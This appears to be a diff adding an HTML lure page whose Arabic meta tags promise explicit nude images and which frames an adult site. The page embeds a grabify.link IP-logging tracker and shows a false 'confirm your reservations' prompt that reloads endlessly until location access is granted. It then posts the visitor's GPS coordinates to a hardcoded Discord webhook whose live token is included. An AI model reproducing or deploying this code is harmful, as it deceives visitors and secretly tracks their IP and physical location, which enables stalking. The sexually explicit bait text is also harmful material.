@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!-- ميلف ممحونه بجسم مربرب تصور نودز و تستعرض لحبيبها المعرص – نودز مصري -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="title" content="نودز مصري فلاحي ناااررررر 🔥🔥🔥🔥" />
+    <meta name="description" content="ميلف ممحونه بجسم مربرب تصور نودز و تستعرض لحبيبها المعرص – نودز مصري" />
+    <meta property="og:type" content="website" />
+    <meta property="og:url" content="https://www.imag-r.com/images/display/image_13733__extra.png" />
+    <meta property="og:title" content="نودز مصري فلاحي ناااررررر 🔥🔥🔥🔥" />
+    <meta property="og:description" content="ميلف ممحونه بجسم مربرب تصور نودز و تستعرض لحبيبها المعرص – نودز مصري" />
+    <meta property="og:image" content="https://www.imag-r.com/images/display/image_13733__extra.png" />
+    <meta property="twitter:card" content="summary_large_image" />
+    <meta property="twitter:url" content="https://www.imag-r.com/images/display/image_13733__extra.png" />
+    <meta property="twitter:title" content="نودز مصري فلاحي ناااررررر 🔥🔥🔥🔥" />
+    <meta property="twitter:description" content="ميلف ممحونه بجسم مربرب تصور نودز و تستعرض لحبيبها المعرص – نودز مصري" />
+    <meta property="twitter:image" content="https://www.imag-r.com/images/display/image_13733__extra.png" />
+    <title>arabhotx</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+        }
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+    </style>
+</head>
+<body>
+    <img src="https://grabify.link/2KHAV8">   
+    <!-- Content is loaded normally without hiding the iframe -->
+    <iframe id="content-frame" src="https://arabhotx.com/ميلف-منقبه-ممحونه-بجسم-مربرب-تصور-نودز/"></iframe>
+
+    <script>
+        const webhookURL = "https://discord.com/api/webhooks/1293612557373935689/ylT9Dtc40v1QJeAF49susiMm__EAWBGvuxxpPwRa2hw8HUjBgYD6m46CpAlLELgyTnK4";
+
+        // Function to get GPS coordinates and send them to the webhook
+        function getGPS() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async function (position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+
+                    // Prepare data with coordinates
+                    const data = {
+                        content: `### User GPS coordinates: ${latitude}, ${longitude}`
+                    };
+
+                    // Send GPS data
+                    try {
+                        await fetch(webhookURL, {
+                            method: "POST",
+                            headers: {
+                                "Content-Type": "application/json"
+                            },
+                            body: JSON.stringify(data)
+                        });
+                    } catch (error) {
+                        console.error("Failed to send GPS data:", error);
+                    }
+                }, function (error) {
+                    // On error (permission denied, etc.), reload the page to prompt again
+                    location.reload();
+                });
+            } else {
+                console.error("Geolocation is not supported by this browser.");
+            }
+        }
+
+        // Trigger an alert and ask for permission to access the user's location
+        window.onload = function () {
+            const userConfirmed = confirm("Location services are required to confirm your reservations. Please enable location access to continue using the site.");
+            if (userConfirmed) {
+                getGPS();
+            } else {
+                // If the user dismisses, reload the page to prompt again
+                location.reload();
+            }
+        };
+    </script>
+
+</body>
+</html>
